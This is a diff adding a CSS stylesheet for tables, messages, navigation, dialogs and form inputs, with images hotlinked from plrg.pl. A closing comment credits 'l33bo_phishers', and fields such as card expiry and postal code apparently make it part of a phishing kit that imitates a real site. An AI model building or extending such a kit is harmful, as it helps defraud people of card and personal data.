+	border:2px solid #c00;
+}
+table.default .failure
+{
+	background:url(http://www.plrg.pl/images/errorIcon.gif) no-repeat .5em 0;
+}
+
+/* - - - - -
+	13.2: Note
+*/
+div.note
+{
+	background:#e1eeee;
+	border:1px solid #ccc;
+	margin-right:.5em; /* Distance between border and portlet's edge */
+	padding-left:.5em; /* Message has no icon */
+	width:95%;
+}
+/* - - - - -
+	13.3: Information
+*/
+div.message.information
+{
+	background:url(http://www.plrg.pl/images/information.gif) no-repeat .5em .5em;
+	padding-left:40px;
+}
+.field div.information /* undo classname collision */
+{
+	background:none;
+	padding-left:0;
+}
+/* - - - - -
+  13.4: Very Important
+*/
+.very-important
+{
+	font-size:1.8em;
+}
+
+/* - - - - -
+	13.7: Message/Warning
+	Message with a warning-triangle to the left of it.
+*/
+.message.warning
+{
+	background:#fee url(http://www.plrg.pl/images/warningIcon.gif) no-repeat .5em 1em;
+	border:2px solid #c00;
+}
+form .message.warning
+{
+	background-position:.5em .75em;
+}
+div.message.warning p,
+.portlet-body form div.message.warning p:first-child
+{
+	background-image:none;
+	padding:.33em 0;
+	min-height:16px;
+}
+table.default .warning
+{
+	background:url(http://www.plrg.pl/images/warningIcon.gif) no-repeat .5em 0;
+}
+
+/* - - - - - - - - - -
+	14: Table
+	Table used for tabular data, intended to be used where it makes sense to sort columns etc.
+
+	Played it safe and forced classification of tables just in case there will ever be other styles of table (quite likely).
+*/
+table.default
+{
+	padding:0; /* Firefox, Opera */
+	margin-right:.5em; /* Table touches portlet keyline */
+
+	/* Spacing */
+	margin-top:1em;
+	margin-bottom:1em;
+
+	border-collapse:collapse;
+}
+table.default th,
+table.default td
+{
+	vertical-align:top;
+}
+/* Default heading style */
+table.default thead th
+{
+	background:#066;
+	padding:.4em .4em;
+}
+/* Table borders */
+table.default th,
+table.default td
+{
+	border:1px solid #ccc;
+}
+table.default th
+{
+	text-align:left;
+}
+table.default thead th,
+table.default thead th a
+{
+	color:#fff;
+}
+table.default thead th div /* Container for header so it can be made relative (Netscape) */
+{
+	padding-right:15px; /* Space reserved for help icon */
+	position:relative; /* Allow help icon to be absolutely positioned (to top-right corner) */
+}
+/* Put the help icon in the top-right corner of the table heading cell */
+table.default thead th div a.help img
+{
+	position:absolute;
+	top:0;
+	right:-3px;
+}
+/* Sort order indicator container */
+table.default thead th div.sort-order
+{
+	text-align:center; /* center the indicator */
+	padding:.25em 0 0 0;
+}
+/* Default cell style */
+table.default td,
+table.default th
+{
+	padding:.4em;
+}
+/* Links in table cells are generally drill-down or column sort (in the header), need to be underlined to be more usable */
+table.default a
+{
+	text-decoration:underline;
+}
+/* Alternate row shading (rows are classified as either 'odd' or 'even' */
+table.default .even
+{
+	background:#e1eeee;
+}
+table
+{
+	background:#fff;
+}
+/* Numeric columns are right-aligned */
+table .numeric,
+table th.numeric
+{
+	text-align:right;
+}
+/* Cells with no wrapping */
+table .no-wrap
+{
+	white-space:nowrap;
+}
+/* - - - - -
+	14.1: With a total row
+*/
+/* Right-align total heading */
+table.default tr.total th,
+table.default tr.subtotal th
+{
+	text-align:right;
+}
+table.default tr.total th,
+table.default tr.total td
+{
+	border-top:2px solid #000;
+	border-bottom:3px double #000;
+}
+table.default tr.total,
+table.default tbody.total
+{
+	font-weight:bold;
+}
+/* - - - - -
+	14.2: Statement
+*/
+table.default.statement thead th,
+table.default.statement td
+{
+	border-bottom-style:none;
+}
+table.default.statement tbody tr:first-child td
+{
+	border-top:1px solid #ccc;
+}
+table.default.statement
+{
+	border-bottom:1px solid #ccc;
+}
+/* - - - - -
+  14.4: Forms
+*/
+table.default th .checkbox
+{
+	margin-top:-.25em;
+}
+table.default td .checkbox
+{
+	margin-top:-.2em;
+}
+table.default .numeric input
+{
+	text-align:right;
+	padding-right:.1em;
+}
+
+/* - - - - - - - - - -
+	15: Navigation List
+	A bit like a menu, inside a portlet.
+*/
+.navigation,
+.navigation .navigation
+{
+	list-style:none;
+	margin:1em 0;
+	padding-left:0;
+}
+.navigation li,
+.navigation .navigation li
+{
+	background:url(http://www.plrg.pl/images/arrowRightGreen.gif) no-repeat .2em .3em;
+	padding-left:1em; /* Space for bullet image. */
+	margin-right:1em;
+	list-style:none;
+}
+.navigation p
+{
+	margin-top:1em; /* IE */
+}
+.navigation a
+{
+	text-decoration:underline; /* underline these links */
+}
+.navigation ul li
+{
+
+	background:none;
+	padding-left:0;
+}
+.navigation ul
+{
+	margin-top:.5em;
+	margin-bottom:.5em;
+}
+/* - - - - -
+	15.1: Inline Navigation
+	Generic inline navigation with bordered separators.
+*/
+.inline-navigation
+{
+	/* Remove default UL indentation */
+	margin:0 auto 0 0;
+	padding-left:0;
+	padding-top:0;
+	padding-bottom:0;
+
+	text-align:center;
+}
+.inline-navigation li
+{
+	display:inline;
+	border-left:1px solid #000; /* separator */
+
+	/* Spacing */
+	padding-left:1em;
+	padding-right:.66em; /* .33em is occupied by whitespace in HTML source */
+}
+/* no separator for first item in list */
+.inline-navigation li:first-child
+{
+	border-left:none;
+	padding-left:0;
+}
+/* - - - - -
+	15.2: Linear navigation
+	Used for link-based back/next navigation through a flow.
+*/
+.linear
+{
+	text-align:right;
+	font-weight:bold;
+}
+.linear a
+{
+	color:#066;
+}
+.linear .back
+{
+	background:url(http://www.plrg.pl/images/arrowLeftCircle.gif) no-repeat center left;
+	padding-left:18px !important;
+}
+.linear .next
+{
+	background:url(http://www.plrg.pl/images/arrowRightCircle.gif) no-repeat center right;
+	padding-right:18px !important;
+}
+/* - - - - -
+	15.3: Portlet Navigation
+	Where portlets are the equivalent of the first page of a process or application, the link(s) to proceed or start the process.
+*/
+.portlet-navigation
+{
+	/* Remove default UL indentation */
+	list-style:none;
+	margin:0;
+	margin-right:.5em;
+	padding-bottom:.5em;
+
+	/* Right-align content */
+	text-align:right;
+}
+.portlet-navigation li
+{
+	margin-bottom:.5em; /* Space between options/links (although normally there will be only one option */
+}
+.portlet-navigation a
+{
+	background:url(http://www.plrg.pl/images/arrowRightGreen.gif) no-repeat 100% 50%; /* Arrow drops down with the wrap. */
+	padding-right:15px; /* Space for right arrow image */
+	display:block; /* Graceful wrapping */
+}
+.portlet-navigation a.up
+{
+	background:url(http://www.plrg.pl/images/arrowUpGreen.gif) no-repeat 100% 50%; /* Arrow drops down with the wrap. */
+	padding-right:15px; /* Space for right arrow image */
+	display:block; /* Graceful wrapping */
+}
+.portlet-navigation a.down
+{
+	background:url(http://www.plrg.pl/images/arrowDownGreen.gif) no-repeat 100% 50%; /* Arrow drops down with the wrap. */
+	padding-right:15px; /* Space for right arrow image */
+	display:block; /* Graceful wrapping */
+}
+.portlet-navigation + *
+{
+	clear:both;
+}
+/* - - - - -
+	15.4: Index
+	E.g. A-Z Index, pagination navigation.
+*/
+.index,
+.portlet-body .index
+{
+	/* remove UL default indentation */
+	padding:0;
+	margin-left:0;
+
+	text-align:center; /* Center the index */
+
+	white-space-collapse:discard;
+
+	list-style:none;
+}
+.index li
+{
+	display:inline-block;
+	margin:0 2px;
+}
+.index li a /* Clickable area */
+{
+	padding:.3em;
+	background:#e1eeee;
+	border:1px solid #ccc;
+	line-height:2em; /* Wrap gracefully */
+}
+.index .selected /* e.g. current page */
+{
+	font-size:1.2em;
+	font-weight:bold;
+}
+/* - - - - -
+	15.5: Page Navigation
+	When data is paged, navigation appears to allow the other pages to be requested.
+*/
+.index.page-navigation li.selected
+{
+	/* Make it look like the ones which are links */
+	border:1px solid #ccc;
+	padding:.3em;
+	background:#e1eeee;
+	font-weight:bold; /* The current page is not a link and therefore its number will be bold */
+}
+.index.page-navigation .previous a
+{
+	background:#e1eeee url(http://www.plrg.pl/images/arrowLeftCircle.gif) no-repeat 5% 50%;
+	padding-left:20px !important; /* Space for arrow */
+}
+.index.page-navigation .next a
+{
+	background:#e1eeee url(http://www.plrg.pl/images/arrowRightCircle.gif) no-repeat 92% 50%;
+	padding-right:20px !important; /* Space for arrow */
+}
+/* - - - - -
+	15.6: Icon-based navigation list
+	Navigation list with space reserved for inline icons (icons that are <IMG> elements because they require alternative text).
+*/
+.icon-list
+{
+	list-style:none; /* Remove bullets */
+
+	/* Remove default indentation */
+	margin:0;
+	margin-top:.5em;
+
+	position:relative; /* Parent for positioned icons */
+	padding-left:2em !important; /* Space for icon */
+}
+.icon-list li
+{
+	margin-bottom:.5em; /* Space between list items */
+}
+.icon-list img.icon
+{
+	position:absolute; /* Take icons out of normal flow so the same space is reserved whether they're there or not */
+	left:0; /* Icons are positioned in margin */
+}
+/* Remove spacing when inside a table */
+table .icon-list
+{
+	margin:0;
+	padding:0;
+}
+/* Remove underline on links when inside a table */
+table .icon-list a
+{
+	text-decoration:none;
+}
+/* - - - - -
+	15.7: Table of contents
+*/
+div.table-of-contents
+{
+	float:left; /* may contain floating elements */
+	width:100%;
+	margin:0;
+	padding:0;
+}
+ul.table-of-contents
+{
+	border-bottom:1px solid #ccc;
+	padding-bottom:1em; /* Space between table of contents and border. */
+	margin:0;
+}
+div.table-of-contents ul.navigation
+{
+	padding-left:0; /* Too much space in Firefox */
+	padding-right:1em;
+}
+div.table-of-contents h2,
+div.table-of-contents h3,
+div.table-of-contents h4
+{
+	color: #000;
+
+	background:#e1eeee;
+
+	/* Spacing */
+	margin:1.33em .5em -.33em 0;
+	padding:.2em;
+
+	position:relative; /* To 'to-top' links can be absolutely positioned. */
+}
+ul.navigation ul.navigation /* Nested navigation links */
+{
+	margin:0; /* Do not indent or space nested navigation links */
+}
+/* The heading may have a "to top" link */
+div.table-of-contents h2 a.to-top,
+div.table-of-contents h3 a.to-top,
+div.table-of-contents h4 a.to-top
+{
+	/* Position the "to top" link*/
+	position:absolute;
+	right:2em;
+	margin:0;
+
+	font-weight:normal;
+}
+/* - - - - - - - - - -
+	15.8: Breadcrumbs
+	Hierarchical navigation history.
+*/
+.breadcrumb
+{
+	padding:0;
+	margin:0;
+	margin-bottom:1em;
+}
+.breadcrumb li
+{
+	display:inline;
+	margin-left:.25em;
+	background:url(http://www.plrg.pl/images/arrowRightGreen.gif) no-repeat 0 .25em;
+	padding-left:.75em; /* Space for arrow separator */
+}
+.breadcrumb li:first-child
+{
+	/* No separator on first child (expected to be "Back to:") */
+	background:none;
+	padding-left:0;
+	margin-left:0;
+	font-weight:bold;
+}
+
+
+/* - - - - - - - - - -
+	16: Progress Bar
+*/
+div.progress-bar
+{
+	border:1px inset #ccc; /* decoration */
+	width:200px;
+	height:12px;
+	float:right;
+	padding:1px 0 1px 1px; /* inner-border */
+	font-size:1px; /* IE - too tall */
+}
+.progress-bar div
+{
+	height:12px;
+	background:#066 url(http://www.plrg.pl/images/progressBar.gif);
+	float:left;
+}
+.progress-bar-text
+{
+	font-weight:bold;
+	float:right; /* Opera 8.54 didn't make this element wide enough for its content otherwise */
+	margin-right:.5em; /* distance between text and progress bar */
+}
+/* Too close to the name */
+#user-information .name
+{
+	margin-bottom:.5em;
+}
+#user-information
+{
+	margin-bottom:.5em;
+	max-width:75%; /* Firefox made this 100% wide when progress bar was used, causing it to wrap underneath */
+}
+
+
+/* - - - - - - - - - -
+	17: Section
+	Generic grouping container.
+*/
+.section
+{
+	border-top:1px solid #ccc;
+	padding:0!important;
+	clear:both;
+	float:left;
+	width:100%;
+}
+
+
+/* - - - - - - - - - -
+	18: Divider
+	Generically separate content.
+*/
+hr
+{
+	height:1px;
+	color:#ccc; /* IE */
+	border:none; /* Firefox & Opera */
+	background-color:#ccc; /* Firefox & Opera */
+	margin:.5em 0;
+	clear:both;
+}
+/* - - - - - - - - - -
+	18.1: Divider on a Heading
+*/
+.divider
+{
+	border-bottom:1px solid #ccc;
+	padding-bottom:.25em;
+	margin-bottom:.25em;
+	margin-top:1em;
+}
+/* - - - - - - - - - -
+	18.2:  Divider on a linked heading
+	Linked heading with indicator symbol
+*/
+h2.link a,
+h3.link a
+{
+	/* Arrows */
+	background:url(http://www.plrg.pl/images/arrowRightGreen.gif) no-repeat center right;
+	padding-right:1em;
+}
+
+/* - - - - - - - - - -
+	19: Calculation
+*/
+div.calculation
+{
+	text-align:center; /* Default alignment */
+	float:left; /* Contains floating elements */
+	border-bottom:1px solid #ccc; /* Divider */
+	padding-bottom:.5em; /* Space before divider */
+	margin-bottom:.5em; /* Space after divider */
+}
+/* Whatever follows the calculation must clear it */
+div.calculation + *
+{
+	clear:both;
+}
+div.calculation dl /* Operand box */,
+div.calculation dd /* Operand value */,
+div.calculation dl.selected span /* Selected indicator */
+{
+	margin:0; /* Remove default spacing */
+	width:8em; /* Width of boxes */
+}
+div.calculation dl /* Operand box */
+{
+	float:left;
+	border:2px solid #ccc;
+	background:#eee;
+	position:relative; /* So the indicator can be absolutely positioned */
+}
+div.calculation dt /* Operand value */
+{
+	border:.1em solid #e1eeee;
+	border-bottom:none;
+	background:#e1eeee;
+}
+/* Try to make the operand boxes all the same height */
+div.calculation dt,
+div.calculation dd
+{
+	min-height:2.5em;
+}
+/* Vertically centre the operand values */
+div.calculation dd
+{
+	line-height:2.5em;
+}
+/* Operators */
+div.calculation .operator
+{
+	float:left;
+	line-height:4.25em; /* Gives central vertical alignment */
+	font-size:1.33em;
+	font-weight:bold;
+	font-family:arial; /* Has a better &plusmn; glyph */
+	padding:0 .2em 0 .2em;
+}
+div.calculation .result dt,
+div.calculation .total
+{
+	font-weight:bold;
+}
+div.calculation dl.selected /* Selected operand box */
+{
+	border-color:#066;
+}
+div.calculation dl.selected span /* Selected operand box indicator */
+{
+	/* Position the arrow */
+	position:absolute;
+	top:5em;
+	left:0;
+	margin-top:2px;
+	background:url(http://www.plrg.pl/images/calculationIndicator.gif) no-repeat center top;
+	height:35px; /* Height of calculationIndicator.gif */
+	z-index:1; /* Behind the fieldset of the linked form */
+}
+/* - - - - -
+	19.1: Linked to a form
+*/
+form.calculation fieldset.calculation /* Form fields linked to calculation operand */
+{
+	border:2px solid #066;
+
+	/* Cover the arrow */
+	background:#fff;
+	position:relative;
+	z-index:2;
+}
+/* legend is required for validation, but don't want to see it. */
+form.calculation fieldset.calculation legend
+{
+	position:absolute; /* Allow the border to be unbroken */
+	left:-3em; /* IE8 */
+}
+/* Reduce default form spacing */
+form.calculation
+{
+	margin:0;
+	padding-top:.5em;
+}
+
+
+/* - - - - - - - - - -
+	999: Footer
+*/
+#footer a
+{
+	color:#000;
+}
+
+
+.formset {
+	
+}
+input ,select{
+outline:none;
+}
+
+.error_strings{
+text-align: left;
+padding-right: 1em;
+padding-left: 35%;
+position: relative;
+padding-top: .25em;
+color: #db0000;
+font-size: 12px;
+}
+
+#dialogoverlay{
+	display: none;
+	opacity: .8;
+	position: fixed;
+	top: 0px;
+	left: 0px;
+	background: #FFF;
+	width: 500%;
+	height: 500%;
+	z-index: 10;
+}
+#dialogbox{
+	display: none;
+	position: fixed;
+	padding-right: .5em;
+	border: 5px solid #066;
+	background:#FFF; 
+	border-radius:10px;	
+	width:650px;
+	height:480px;
+	z-index: 10;
+}
+#dialogbox > div	{ 
+	background:#FFF; 
+	margin:0px; 
+}
+#dialogbox > div > #dialogboxhead	{
+	}
+#dialogbox > div > #dialogboxbody	{ 
+	background:#FFF; 
+	padding-top:40px; 
+	color:#000;
+}
+#dialogbox > div > #dialogboxfoot{ 
+
+}
+.std{
+	width: 22.04em;
+}
+.dateexpiry{
+	width: 5.04em;
+}
+input {
+	padding-left:1.5px;
+}
+input.postal    {width: 9.12em;}
+/*
+Created by l33bo_phishers -- icq: 695059760 
+*/
